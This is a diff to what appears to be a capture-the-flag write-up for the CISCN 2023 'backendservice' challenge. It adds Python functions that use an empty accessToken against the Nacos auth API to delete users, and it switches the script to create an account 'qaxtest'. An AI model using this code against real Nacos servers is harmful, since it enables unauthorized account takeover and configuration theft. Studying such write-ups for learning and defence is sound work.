@@ -2,6 +2,8 @@
 layout: post
 title: ciscn2023 backendservice
 date: 2023-06-04 14:12 +0800
+categories: [pentest, nacos]
+tag: [web, nacos]
 ---
 
 ## 题目描述
@@ -159,6 +161,14 @@ def modify_password(username,newpassword):
         headers = headers
     )
     print(json.dumps(r.json()['message'],indent=4))
+
+def delete_user(username,password):
+    r = requests.delete(
+        url = f'http://god.cc:8888/nacos/v1/auth/users?accessToken=&username={username}&password={password}',
+        headers = headers
+    )
+    print(json.dumps(r.json()['message'],indent=4))
+
     
 def leak_config():
     r = requests.get(
@@ -169,8 +179,9 @@ def leak_config():
     
 if __name__ == "__main__":
     list_users()
-    modify_password('nacos','aaa')
-    # # create_user()
+    # delete_user('qaxtest','qaxtest@123')
+    # modify_password('nacos','aaa')
+    create_user('qaxtest','qaxtest@123')
     # list_users()
     # leak_config()
 ```
